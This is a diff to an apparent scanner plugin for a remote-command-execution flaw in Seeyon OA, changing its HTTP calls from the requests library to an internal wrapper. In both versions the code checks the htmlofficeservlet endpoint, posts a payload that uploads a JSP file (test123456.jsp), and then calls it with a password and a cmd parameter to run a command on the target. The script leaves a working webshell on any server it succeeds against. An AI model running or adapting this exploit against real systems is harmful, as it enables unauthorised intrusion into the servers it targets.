@@ -5,7 +5,7 @@ name: seeyou漏洞
 description: seeyou漏洞可执行任意命令
 '''
 
-import requests
+from app.lib.utils.request import request
 
 class See_Yon_BaseVerify:
     def __init__(self, url):
@@ -34,11 +34,11 @@ class See_Yon_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.get(self.url + "/seeyon/htmlofficeservlet", headers = self.headers, allow_redirects=False, verify = False)
+            check_req = request.get(self.url + "/seeyon/htmlofficeservlet", headers = self.headers)
             if check_req.status_code == 200 and "DBSTEP V3.0     0               21              0               htmoffice operate err" in check_req.text :
                 print("存在seeyou漏洞")
-                jsp__req = requests.post(self.url + "/seeyon/htmlofficeservlet", data = self.payload, headers = self.headers, allow_redirects=False, verify = False)
-                cmd_req = requests.get(self.url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=echo asasd3344", headers = self.headers, allow_redirects=False, verify = False)
+                jsp__req = request.post(self.url + "/seeyon/htmlofficeservlet", data = self.payload, headers = self.headers)
+                cmd_req = request.get(self.url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=echo asasd3344", headers = self.headers)
                 if cmd_req.status_code == 200 and "asasd3344" in cmd_req.text:
                     print("上传的jsp文件路径为:", self.url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=echo asasd3344")
                     return True
